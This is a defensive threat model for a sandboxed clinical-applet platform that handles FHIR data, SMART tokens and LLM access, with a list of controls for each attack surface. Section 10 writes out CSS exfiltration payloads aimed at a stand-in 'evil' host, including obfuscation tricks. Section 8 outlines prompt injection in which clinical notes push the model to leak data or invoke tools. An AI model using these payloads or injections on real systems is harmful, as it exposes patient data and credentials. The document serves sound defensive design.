# Threat model

## Security objective

Prevent an untrusted or compromised clinical applet from **silently and programmatically transmitting clinical data or credentials to an unapproved destination**, while still allowing it to display data to the authorized clinician and invoke broad FHIR and approved LLM capabilities.

This is a bounded objective. It is not a claim that data displayed to a human can never leave the workstation.

## Protected assets

- SMART access and refresh tokens;
- LLM provider credentials and covered-tenant configuration;
- FHIR resources returned under the clinician's grant;
- patient, encounter, user, and purpose-of-use context;
- prompt and model response content;
- audit records and applet identity;
- trusted shell DOM and JavaScript objects;
- browser-origin storage belonging to the EHR or shell.

## Adversary

Assume applet source can be malicious, compromised, LLM-generated incorrectly, or intentionally constructed to exfiltrate data. It may:

- use any ECMAScript behavior available in its worker;
- allocate memory and consume CPU;
- make arbitrary calls to the capabilities it was given;
- render misleading UI through allowed components;
- exploit bugs in Remote DOM, the renderer, chart library, RPC, browser, or shell;
- embed prompt injection in content sent to an LLM.

Do not assume that applet authors are security experts.

## Trusted computing base

- browser and operating system;
- managed endpoint and browser policy;
- trusted shell source and dependencies;
- sandbox bootstrap and worker harness;
- Remote DOM and RPC implementation;
- host component renderers and Vega sanitizer/loader;
- SMART client and FHIR server authorization;
- LLM adapter and covered provider configuration;
- static asset origins and any same-origin API gateway.

The value of the design is that this set is reviewed once as a platform. It is not zero.

## Out of scope / residual channels

The architecture cannot prevent:

- a clinician photographing, copying, reading aloud, or manually retyping displayed data;
- intentional disclosure through a permitted EHR write, model prompt, or approved hospital communication workflow;
- malicious or overprivileged browser extensions;
- operating-system compromise, screen capture malware, accessibility API abuse, or kernel compromise;
- browser, Remote DOM, RPC, renderer, or JavaScript-engine zero-days;
- visual steganography shown to a colluding human;
- inference of data through aggregate timing where the observer already controls a trusted endpoint;
- denial of service against the current tab, although workers can be terminated and budgeted.

The product should distinguish **silent machine exfiltration** from ordinary authorized display and user-mediated disclosure.

## Attack surfaces and controls

### 1. Raw credential theft

**Attack:** read SMART token, refresh token, cookie, session state, LLM key, or provider endpoint.

**Controls:**

- applet never receives the `fhirclient` object or its state;
- applet receives only a callable FHIR request proxy;
- forbidden authentication and cookie headers are stripped;
- iframe has an opaque origin and no shell DOM access;
- LLM profile IDs are opaque and credentials remain in the trusted adapter;
- errors and audit events must redact headers and client state.

### 2. Generic network exfiltration

**Attack:** `fetch`, XHR, WebSocket, EventSource, `sendBeacon`, WebRTC, DNS-triggering resources, remote module import, or package loader.

**Controls:**

- applet runs in a Blob worker inheriting the frame CSP;
- sandbox CSP uses `connect-src 'none'`;
- no real DOM exists in the worker;
- no URL-fetch or generic proxy capability is exposed;
- production egress proxy/browser policy independently blocks the sandbox identity from arbitrary Internet access;
- runtime dependency assets are prebundled and local.

**Residual:** a browser defect or permissive future API could bypass expected CSP behavior. Continuous browser attack tests are required.

### 3. DOM-triggered disclosure

**Attack:** images, CSS URLs, SVG, links, forms, media, fonts, iframes, navigation, downloads, clipboard, print, drag-and-drop, or custom protocols.

**Controls:**

- untrusted code has no real DOM;
- Remote DOM exposes only named custom elements;
- the host never renders arbitrary HTML, styles, URLs, SVG source, or applet-selected element names;
- component properties are normalized and bounded;
- Vega rejects URL-bearing fields and host actions;
- sandbox flags and Permissions Policy deny additional capabilities.

### 4. Storage and cross-session signaling

**Attack:** store PHI in cookies, localStorage, IndexedDB, Cache API, service workers, shared workers, BroadcastChannel, or shared origin state.

**Controls:**

- no `allow-same-origin` means the iframe has an opaque origin;
- worker inherits that context;
- (`Clear-Site-Data` on the frame response was removed for performance — it is
  non-load-bearing here: an opaque-origin launcher has no persistent storage to clear);
- no service-worker or shared-worker capability is needed;
- applet lifecycle terminates the worker;
- production should use a unique, non-reused sandbox origin and no credentials.

### 5. MessagePort protocol confusion

**Attack:** impersonate a frame, replay a capability, pass unexpected transferables, retain callbacks forever, send giant/deep objects, or confuse applet identity.

**Controls in spike:**

- one-time random nonce in iframe URL and transfer message;
- verification of `event.source === window.parent`;
- dedicated MessageChannel rather than ongoing global messages;
- exact protocol, applet ID, and version check;
- Zod validation of capability arguments;
- host-created capability functions only.

**Required production additions:**

- pre-deserialization byte limits where possible;
- depth, key-count, string, and transferable limits;
- request IDs, deadlines, cancellation, and concurrency budgets;
- callback retain/release metrics and leak alarms;
- capability revocation when patient context changes;
- signed applet manifest binding.

### 6. Renderer compromise

**Attack:** malformed properties trigger XSS, prototype pollution, memory exhaustion, unbounded chart transforms, event confusion, or hidden URL loads.

**Controls:**

- closed component map;
- property clamping and truncation;
- no `dangerouslySetInnerHTML`;
- no applet CSS or arbitrary classes;
- inline data only for Vega;
- row/spec/array budgets;
- dependency pinning and security updates;
- browser tests with hostile payloads.

**Residual:** the renderer is a high-value trusted component. It needs dedicated fuzzing and review.

### 7. Broad FHIR capability abuse

**Attack:** enumerate all data available to the clinician, request huge bundles, perform unexpected writes, or use FHIR operations as a covert disclosure channel.

**Controls:**

- SMART/FHIR server remains the authorization boundary;
- active patient/user/encounter context is displayed and audited;
- relative active-base requests only;
- size/time/concurrency quotas;
- optional patient-compartment enforcement or sensitive-data overlays can be enabled institutionally;
- write methods are a separate launch policy and disabled in the spike;
- no arbitrary destination.

**Trade-off:** broad access intentionally increases what a malicious applet can read. The product is betting that removing external egress and credentials makes that acceptable for low-review app innovation. Hospitals may still require disclosure notices, applet ownership, signed bundles, and behavioral monitoring.

### 8. LLM prompt injection and tool misuse

**Attack:** notes instruct the model to reveal data, invoke tools, generate malicious code, or encode secrets in output.

**Controls:**

- applet chooses only approved model profiles;
- model has no web, URL, remote MCP, or generic network tools;
- FHIR calls remain independently authorized through the broker;
- output schemas and size limits;
- selected evidence rather than automatic whole-chart forwarding where practical;
- PHI-safe logging and covered retention settings;
- no server-side code execution; any generated JavaScript remains in the same browser worker containment model.

### 9. Resource exhaustion

**Attack:** infinite loop, memory growth, mutation flood, chart explosion, or repeated FHIR/LLM calls.

**Controls to add:**

- one applet per worker;
- host heartbeat and wall-clock watchdog;
- worker termination and clean restart;
- mutation-rate and retained-callback budgets;
- FHIR/LLM rate, byte, and token quotas;
- foreground/background tab policy;
- browser memory telemetry without PHI content.

A worker cannot be preempted from inside the same worker. Hard termination by the host is essential.

### 10. CSS exfiltration (applet stylesheets)

**Attack:** an applet supplies CSS that fetches an attacker URL —
`background: url(https://evil?leak=…)`, `@import`, `@font-face src`,
`filter: url()`, `cursor: url()`, hidden behind comments (`ur/**/l`), escapes
(`\75rl`), or `var()` indirection.

**The guarantee is the CSP, not the validator.** An applet stylesheet is installed
into the host document (its ShadowRoot), so every resource it can load is governed by
the **host page CSP**. The CSS-reachable directives are all locked to non-external —
`img-src data: blob:`, `font-src 'self' data:`, `style-src 'self' 'unsafe-inline'`,
fallback `default-src 'self'`. **CSS cannot use `connect-src`** (the one open
directive, used by the wrapper to load applets/reach FHIR); it loads resources only
through the image/font/style directives. CSP's mandatory fallback chain means even a
*future* CSS-fetch feature resolves to `default-src` — so external exfil is blocked by
construction, not by recognizing each trick. The browser refuses the request.

**Defense-in-depth (the validator).** `css-validator.ts` parses with postcss,
normalizes comments + escapes (so `ur/**/l` and `\75rl` collapse to `url`), and
validates every declaration value (including custom properties — `var()` can only
re-inject already-validated tokens). It closes the only residual the CSP leaves —
*same-origin* CSS fetches into the wrapper's own logs — and gives a clear error
instead of a silent CSP block. It is a second fail-closed layer, not the boundary.

### 11. Showing documents without an arbitrary-origin fetch

**Attack:** turn a displayed document into an exfil sink — make the host fetch an
attacker-chosen URL (with the clinician's token), or smuggle data out in a URL the
applet supplies.

**Controls — no applet-chosen origin exists.** There is deliberately *no* capability
that fetches an applet-supplied URL. An earlier design let the applet pass an
`Attachment.url` for the broker to fetch host-side and return as an opaque handle;
that was **removed**, because the applet choosing the request origin is itself the
exfiltration channel (point the host at an attacker origin, or encode data in the
path) — a confused-deputy that re-grants the network egress the sandbox exists to
remove. Documents are instead shown from bytes the applet already holds: a FHIR
`Attachment`/`Binary` is read via `session.smart` (the broker only ever reaches the
fixed trusted FHIR origin), and the inline base64 `data` is rendered as a
self-contained `data:` URL. `ui-image` accepts a `src` that the firewall validates to
be **`data:` only** — any remote or relative src is rejected — and the host CSP
`img-src data: blob:` blocks external image loads regardless. So an image makes no
network request and there is no host-side fetch the applet can steer.

> Note on the API: capabilities are exposed to applets as one `session` object
> (`session.smart` / `ai` / `styles` / `audit`), each backed by a single host handler
> that is the one enforcement point. Every handler reaches only a fixed trusted origin;
> none lets the applet pick a destination — see ARCHITECTURE.md / HOST_API.md.

## Security claim language

Recommended:

> Applets receive no ambient EHR credentials, network, storage, or DOM authority. They can use clinical data and approved AI only through an audited host interface. Under supported managed-browser configurations, ordinary applet JavaScript cannot silently transmit data to arbitrary Internet destinations.

Avoid:

> Data can only leave through a browser zero-day.

The latter ignores trusted-runtime defects, renderer bugs, extensions, endpoint compromise, user-mediated disclosure, approved tool channels, and deployment mistakes.
